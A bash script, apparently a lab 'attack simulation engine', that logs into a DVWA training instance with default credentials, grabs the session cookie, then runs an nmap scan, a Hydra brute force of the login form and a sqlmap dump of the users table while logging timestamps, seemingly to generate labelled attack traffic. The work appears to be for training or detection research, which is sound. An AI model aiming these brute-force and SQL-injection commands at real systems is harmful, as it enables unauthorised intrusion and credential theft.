#!/usr/bin/env bash
set -euo pipefail

LOG_FILE="/logs/attack_log.txt"
TARGET_IP="10.10.0.10"
PASSWORDS_FILE="/root/attacks/passwords.txt"

# Helper for UTC ISO-8601 timestamps
timestamp() {
    date -u +"%Y-%m-%dT%H:%M:%SZ"
}

log_event() {
    local action="$1"
    local attack="$2"
    local ts
    ts=$(timestamp)
    echo "${action} ${attack} ${ts}" | tee -a "$LOG_FILE"
}

echo "=== Initializing Attack Simulation Engine ==="
mkdir -p /logs /captures
pkill -9 -x hydra 2>/dev/null || true
rm -f /root/attacks/hydra.restore 2>/dev/null || true

# 1. Obtain Authenticated Session Cookie from DVWA
echo "[+] Ensuring DVWA database is initialized..."
curl -s -d "create_db=Create%20%2F%20Reset%20Database" "http://${TARGET_IP}/setup.php" > /dev/null 2>&1 || true

echo "[+] Logging in to DVWA to acquire authenticated session cookie..."
COOKIE_JAR="/tmp/dvwa_cookies.txt"
rm -f "$COOKIE_JAR"

# Request login page to obtain initial session cookie in COOKIE_JAR and extract matching CSRF token
LOGIN_HTML=$(curl -s -c "$COOKIE_JAR" "http://${TARGET_IP}/login.php")
USER_TOKEN=$(echo "$LOGIN_HTML" | grep -oP "name='user_token' value='\K[a-f0-9]+" || true)
PHPSESSID=$(grep "PHPSESSID" "$COOKIE_JAR" | awk '{print $7}' || true)

# Authenticate session using the matching token and session ID
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
     -d "username=admin&password=password&Login=Login&user_token=${USER_TOKEN}" \
     "http://${TARGET_IP}/login.php" > /dev/null

# Also set security level to low explicitly
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
     -d "security=low&seclev_submit=Submit" \
     "http://${TARGET_IP}/security.php" > /dev/null || true

echo "[+] Authenticated session established: PHPSESSID=${PHPSESSID}"
sleep 2

# ----------------------------------------------------
# Attack Functions (100% Independent & Decoupled)
# ----------------------------------------------------
attack_nmap() {
    log_event "START" "nmap_scan"
    echo "[+] Running Nmap scan against ${TARGET_IP}..."
    nmap -sV -sT -p 1-1000 "${TARGET_IP}" -oN /logs/nmap_results.txt || true
    log_event "END" "nmap_scan"
}

attack_hydra() {
    log_event "START" "hydra_bruteforce"
    echo "[+] Running Hydra brute force against DVWA..."
    local target_user="${TARGET_USER:-admin}"
    timeout 60 hydra -l "${target_user}" -P "${PASSWORDS_FILE}" "${TARGET_IP}" http-get-form \
      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=${PHPSESSID}; security=low:F=incorrect" \
      -t 4 -w 5 -vV -o /logs/hydra_results.txt || true
    log_event "END" "hydra_bruteforce"
}

attack_sqlmap() {
    log_event "START" "sqlmap_sqli"
    echo "[+] Running sqlmap against DVWA SQLi endpoint..."
    sqlmap -u "http://${TARGET_IP}/vulnerabilities/sqli/?id=1&Submit=Submit" \
      --cookie="PHPSESSID=${PHPSESSID}; security=low" \
      --batch \
      --dump -T users -D dvwa \
      --output-dir=/logs/sqlmap_out || true
    log_event "END" "sqlmap_sqli"
}

# Determine which attacks to run (default: all)
MODE="${1:-all}"
case "$MODE" in
    nmap|recon)
        attack_nmap
        ;;
    hydra|brute)
        attack_hydra
        ;;
    sqli|sqlmap)
        attack_sqlmap
        ;;
    all|*)
        attack_nmap
        sleep 5  # Inter-attack cooldown for distinct network flow boundaries
        attack_hydra
        sleep 5  # Inter-attack cooldown
        attack_sqlmap
        ;;
esac

echo "=== Attack Simulation Completed Successfully ==="
echo "[+] Log summary stored in ${LOG_FILE}:"
cat "$LOG_FILE"
